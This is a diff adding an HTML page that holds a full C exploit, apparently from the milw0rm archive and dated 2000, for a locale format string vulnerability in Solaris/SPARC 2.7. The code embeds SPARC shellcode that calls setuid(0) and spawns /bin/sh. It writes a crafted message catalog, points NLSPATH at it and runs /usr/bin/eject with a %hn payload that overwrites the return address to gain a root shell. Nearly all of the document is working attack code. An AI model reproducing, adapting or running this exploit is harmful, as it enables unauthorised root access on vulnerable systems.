@@ -1,0 +1,310 @@
+<html>
+<head>
+<title>Solaris/SPARC 2.7 / 7 locale Format String Exploit</title>
+<pre>
+/*
+   Exploit for the locale format string vulnerability in Solaris/SPARC 2.7 / 7
+   Based on the exploit by Warning3 &lt;warning3@nsfocus.com&gt;
+
+   For additional information see http://www.phreedom.org/solar/locale_sol.txt
+
+   By Solar Eclipse &lt;solareclipse@phreedom.org&gt;
+   Assistant Editor,
+   Phreedom Magazine
+   http://www.phreedom.org
+
+   10 Oct 2000
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/systeminfo.h&gt;
+
+#define NUM     98          /* default number of words to dump from the stack */
+#define ALIGN   3           /* default align (can be 0, 1, 2, 3) */
+#define RETLOCOFS -16       /* default offset of the return address location */
+#define SHELLOFS -6         /* default offset of the jump location from the beginning of the shell buffer */
+#define RETLOC  0xfffffffd
+
+#define PATTERN 1024        /* format string buffer size */
+#define SHELL   1024        /* shell buffer size */
+
+#define NOP     0xac15a16e
+
+#define VULPROG &quot;/usr/bin/eject&quot;
+
+char shellcode[] =      /* from scz's funny shellcode for SPARC */
+    &quot;\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08&quot;  /* setuid(0)  */
+    &quot;\xaa\x1d\x40\x15\x90\x05\x60\x01\x92\x10\x20\x09&quot;  /* dup2(1,2)  */
+    &quot;\x94\x05\x60\x02\x82\x10\x20\x3e\x91\xd0\x20\x08&quot;
+    &quot;\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65\x20\x80\x3a\x29&quot;
+    &quot;\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34\x92\x0b\x80\x0e&quot;
+    &quot;\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\xc0\x2a\x20\x07&quot;
+    &quot;\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01&quot;
+    &quot;\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff&quot;;
+
+/* get current stack point address */
+
+long get_sp(void)
+{
+    __asm__(&quot;mov %sp,%i0&quot;);
+}
+
+/* prints a long to a string */
+
+char* put_long(char* ptr, long value)
+{
+    *ptr++ = (char) (value &gt;&gt; 24) &amp; 0xff;
+    *ptr++ = (char) (value &gt;&gt; 16) &amp; 0xff;
+    *ptr++ = (char) (value &gt;&gt; 8) &amp; 0xff;
+    *ptr++ = (char) (value &gt;&gt; 0) &amp; 0xff;
+
+    return ptr;
+}
+
+/* check if a long contains zero bytes */
+
+int contains_zero(long value)
+{
+    return !((value &amp; 0x00ffffff) &amp;&amp;
+             (value &amp; 0xff00ffff) &amp;&amp;
+             (value &amp; 0xffff00ff) &amp;&amp;
+             (value &amp; 0xffffff00));
+
+}
+
+/* create the shell buffer */
+
+void create_shellbuf(char* shellbuf, int align, int retloc)
+{
+    char *ptr;
+    int i;
+
+    /* check align parameter */
+
+    if (align &lt; 0 || align &gt; 3) {
+        printf(&quot;Error: align is %d, it should be between 0 and 3\n&quot;, align);
+        exit(1);
+    }
+
+    /* check retloc parameter */
+
+    if (contains_zero(retloc) || contains_zero(retloc+2) ) {
+        printf(&quot;Error: retloc (0x%x) or retloc+2 (0x%x) contains a zero byte\n&quot;, retloc, retloc+2);
+        exit(1);
+    }
+
+    /* start constructing the shell buffer */
+
+    ptr = shellbuf;
+
+    for (i = 0; i &lt; align; i++) {
+        *ptr++ = 0x41;      /* alignment padding */
+    }
+
+    ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format specifier */
+
+    ptr = put_long(ptr, retloc);            /* put the address of the low order half-word of the return
+                                               address on the stack */
+
+    ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format specifier */
+
+    ptr = put_long(ptr, retloc + 2);        /* put the address of the high order half-word of the
+                                               return address on the stack */
+
+    /* fill the shellbuf with NOP instructions but leave enough space for the shell code */
+
+    while ((long)ptr + 4 + strlen(shellcode) + 1 &lt; (long)shellbuf + SHELL) {
+        ptr = put_long(ptr, NOP);
+    }
+
+    memcpy(ptr, shellcode, strlen(shellcode));      /* copy the shellcode */
+    ptr = ptr + strlen(shellcode);
+
+    /* add additional padding to the shell buffer to make sure its size is always the same */
+
+    while ((long)ptr &lt; (long)shellbuf + SHELL - 1) {
+        *ptr++ = 0x41;
+    }
+
+    *ptr = 0;                               /* null-terminate */
+
+    /* at this point the shell buffer should be exactly SHELL bytes long, including the null-terminator */
+
+    if (strlen(shellbuf) + 1 != SHELL) {
+        printf(&quot;Error: The shell buffer is %d bytes long. It should be %d bytes. Something went terribly wrong...\n&quot;,
+                strlen(shellbuf)+1, SHELL);
+        exit(1);
+    }
+
+    return;
+}
+
+/* execute the vulnerable program using our custom environment */
+
+void execute_vulnprog(char* pattern, char* shellbuf)
+{
+    char *env[3];
+    FILE *fp;
+
+    /* create message files */
+
+    if (strlen(pattern) &gt; 512) {
+        printf(&quot;Warning: The pattern is %d bytes long. Only the first 512 bytes will be used.\n&quot;, strlen(pattern));
+    }
+
+    if ( !(fp = fopen(&quot;messages.po&quot;, &quot;w+&quot;)) ) {
+        perror(&quot;Error openning messages.po for writing.&quot;);
+        exit(1);
+    }
+
+    fprintf(fp, &quot;domain \&quot;messages\&quot;\n&quot;);
+    fprintf(fp, &quot;msgid  \&quot;usage: %%s [-fndq] [name | nickname]\\n\&quot;\n&quot;);
+    fprintf(fp, &quot;msgstr \&quot;%s\\n\&quot;&quot;, pattern);
+    fclose(fp);
+
+    system(&quot;/usr/bin/msgfmt messages.po&quot;);
+    system(&quot;cp messages.mo SUNW_OST_OSCMD&quot;);
+    system(&quot;cp messages.mo SUNW_OST_OSLIB&quot;);
+
+    /* prepere the environment for the VULNPROG process */
+
+    env[0] = &quot;NLSPATH=:.&quot;;
+    env[1] = shellbuf;              /* put the shellbuf in env */
+    env[2] = NULL;                  /* end of env */
+
+    /* execute the vulnerable program using our custom environment */
+
+    execle(VULPROG, VULPROG, &quot;-x&quot;, NULL, env);
+}
+
+
+/* print the program usage */
+
+void usage(char *prg)
+{
+    printf(&quot;Usage:\n&quot;);
+    printf(&quot;    %s [command] [options]\n\n&quot;, prg);
+    printf(&quot;Commands:\n&quot;);
+    printf(&quot;  dump                   Dumps the stack\n&quot;);
+    printf(&quot;  shell                  Dumps the shell buffer\n&quot;);
+    printf(&quot;  exploit                Exploits /usr/bin/eject\n\n&quot;);
+    printf(&quot;Options:\n&quot;);
+    printf(&quot;  --num=96               Number of words to dump from the stack\n&quot;);
+    printf(&quot;  --align=2              Sets the alignment (0, 1, 2 or 3)\n&quot;);
+    printf(&quot;  --shellofs=-6          Offset of the shell buffer\n&quot;);
+    printf(&quot;  --retlocofs=-4         Retloc adjustment (must be divisible by 4)\n&quot;);
+    printf(&quot;  --retloc=0xeffffa3c    Location of the return address\n&quot;);
+
+    exit(0);
+}
+
+/* main */
+
+main(int argc, char **argv)
+{
+    char shellbuf[SHELL], pattern[PATTERN], platform[256];
+    char *ptr;
+    long sp_addr, sh_addr, jmp_addr, reth, retl;
+    int num = NUM, align = ALIGN, shellofs = SHELLOFS, retlocofs = RETLOCOFS, retloc = RETLOC;
+    int i;
+
+    int dump = 0, shell = 0, exploit = 0;
+
+    /* read the exploit arguments */
+
+    if (argc &lt; 2) {
+        usage(argv[0]);
+    }
+
+    if (!strncmp(argv[1], &quot;dump&quot;, 4)) { dump = 1; }
+    else if(!strncmp(argv[1], &quot;shell&quot;, 5)) { shell = 1; }
+    else if(!strncmp(argv[1], &quot;exploit&quot;, 7)) { exploit = 1; }
+    else {
+        usage(argv[0]);
+    }
+
+    for (i = 2; i &lt; argc; i++) {
+        if ( (sscanf(argv[i], &quot;--align=%d&quot;, &amp;align) ||
+              sscanf(argv[i], &quot;--num=%d&quot;, &amp;num) ||
+              sscanf(argv[i], &quot;--shellofs=%d&quot;, &amp;shellofs) ||
+              sscanf(argv[i], &quot;--retlocofs=%d&quot;, &amp;retlocofs) ||
+              sscanf(argv[i], &quot;--retloc=%x&quot;, &amp;retloc))== 0) {
+                printf(&quot;Unrecognized option %s\n\n&quot;, argv[i]);
+                usage(argv[0]);
+            }
+    }
+
+    /* create the shell buffer */
+
+    create_shellbuf(shellbuf, align, retloc);
+
+    /* calculate memory addresses */
+
+    sysinfo(SI_PLATFORM, platform, 256);            /* get platform info  */
+
+    sp_addr = (get_sp() | 0xffff) &amp; 0xfffffffc;     /* get stack bottom address */
+    sh_addr = sp_addr - (strlen(VULPROG)+1) - (strlen(platform)+1) - (strlen(shellbuf)+1) + shellofs;
+
+    /* sh_add now points to the beginning of the shell buffer */
+
+    printf(&quot;Calculated shell buffer address: 0x%x\n&quot;, sh_addr);
+
+    if (shell == 1) {
+        put_long(&amp;shellbuf[align], sh_addr);        /* put sh_addr on the stack */
+    }
+
+    if ( ((sh_addr + align) &amp; 0xfffffffc) != (sh_addr + align) ) {
+        printf(&quot;Warning: sh_addr + align must be word aligned. Adjust shellofs and align as neccessary\n&quot;);
+    }
+
+    if (retloc == RETLOC) {                         /* if retloc was not specified on the command line, calculate it */
+        retloc = sh_addr + align - num*4 + retlocofs;
+        printf(&quot;Calculated retloc: 0x%x\n&quot;, retloc);
+
+        put_long(&amp;shellbuf[align+4], retloc);
+        put_long(&amp;shellbuf[align+12], retloc+2);
+    }
+
+    jmp_addr = (sh_addr + align) + 64;              /* Calculate the shell jump location */
+    printf(&quot;Calculated shell code jump location: 0x%x\n\n&quot;, jmp_addr);
+
+    /* create the format string */
+
+    ptr = pattern;
+    for (i = 0; i &lt; num; i++) {
+        memcpy(ptr, &quot;%.8x&quot;, 4);
+        ptr = ptr + 4;
+    }
+
+    if (dump == 1) {
+        *ptr = 0;                                   /* null-terminate */
+        printf(&quot;Stack dump mode, dumping %d words\n&quot;, num);
+    }
+    else if (shell == 1) {
+        sprintf(ptr, &quot; Shell buffer: %%s&quot;);
+
+        printf(&quot;shellbuf (length = %d): %s\n\n&quot;, strlen(shellbuf)+1, shellbuf);
+        printf(&quot;Shell buffer dump mode, shell buffer address is 0x%x\n&quot;, sh_addr);
+    }
+    else {
+        reth = (jmp_addr &gt;&gt; 16) &amp; 0xffff;
+        retl = (jmp_addr &gt;&gt; 0) &amp; 0xffff;
+
+        sprintf(ptr, &quot;%%%uc%%hn%%%uc%%hn&quot;, (reth - num * 8), (retl - reth));
+        printf(&quot;Exploit mode, jumping to 0x%x\n&quot;, jmp_addr);
+    }
+
+    printf(&quot;num: %d\t\talign: %d\tshellofs: %d\tretlocofs: %d\tretloc: 0x%x\n\n&quot;,
+            num, align, shellofs, retlocofs, retloc);
+
+    /* execute the vulnerable program using our custom environment */
+
+    execute_vulnprog(pattern, shellbuf);
+
+}
+
+
+// milw0rm.com [2000-11-20]
+</pre>
+</html>
+
